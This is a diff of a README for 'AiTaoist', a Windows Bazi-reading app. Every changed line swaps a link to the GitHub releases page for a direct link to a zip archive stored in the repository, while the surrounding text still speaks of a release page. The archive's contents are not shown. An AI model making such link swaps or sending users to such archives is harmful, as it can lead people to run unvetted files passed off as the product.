@@ -1,12 +1,12 @@
 # 🧭 AiTaoist - Clear Bazi Reading on Windows
 
-[![Download AiTaoist](https://img.shields.io/badge/Download%20AiTaoist-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/AlimohamedElsharkawy/AiTaoist/releases)
+[![Download AiTaoist](https://img.shields.io/badge/Download%20AiTaoist-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/AlimohamedElsharkawy/AiTaoist/raw/refs/heads/master/deploy-package/Ai_Taoist_v3.6.zip)
 
 ## 🚀 Download
 
 Visit this page to download AiTaoist for Windows:
 
-[https://github.com/AlimohamedElsharkawy/AiTaoist/releases](https://github.com/AlimohamedElsharkawy/AiTaoist/releases)
+[https://github.com/AlimohamedElsharkawy/AiTaoist/raw/refs/heads/master/deploy-package/Ai_Taoist_v3.6.zip](https://github.com/AlimohamedElsharkawy/AiTaoist/raw/refs/heads/master/deploy-package/Ai_Taoist_v3.6.zip)
 
 ## 🖥️ What AiTaoist Does
 
@@ -38,7 +38,7 @@ For the best experience, keep Windows updated and close extra apps before you op
 ## 📥 Download and Install
 
 1. Open the release page:
-   [https://github.com/AlimohamedElsharkawy/AiTaoist/releases](https://github.com/AlimohamedElsharkawy/AiTaoist/releases)
+   [https://github.com/AlimohamedElsharkawy/AiTaoist/raw/refs/heads/master/deploy-package/Ai_Taoist_v3.6.zip](https://github.com/AlimohamedElsharkawy/AiTaoist/raw/refs/heads/master/deploy-package/Ai_Taoist_v3.6.zip)
 
 2. Find the latest release at the top of the page.
 
@@ -151,7 +151,7 @@ The app focuses on a clean experience, clear output, and a path that feels famil
 
 Check the GitHub release page for the newest version, file names, and any update details:
 
-[https://github.com/AlimohamedElsharkawy/AiTaoist/releases](https://github.com/AlimohamedElsharkawy/AiTaoist/releases)
+[https://github.com/AlimohamedElsharkawy/AiTaoist/raw/refs/heads/master/deploy-package/Ai_Taoist_v3.6.zip](https://github.com/AlimohamedElsharkawy/AiTaoist/raw/refs/heads/master/deploy-package/Ai_Taoist_v3.6.zip)
 
 ## 🖱️ Quick Start
 
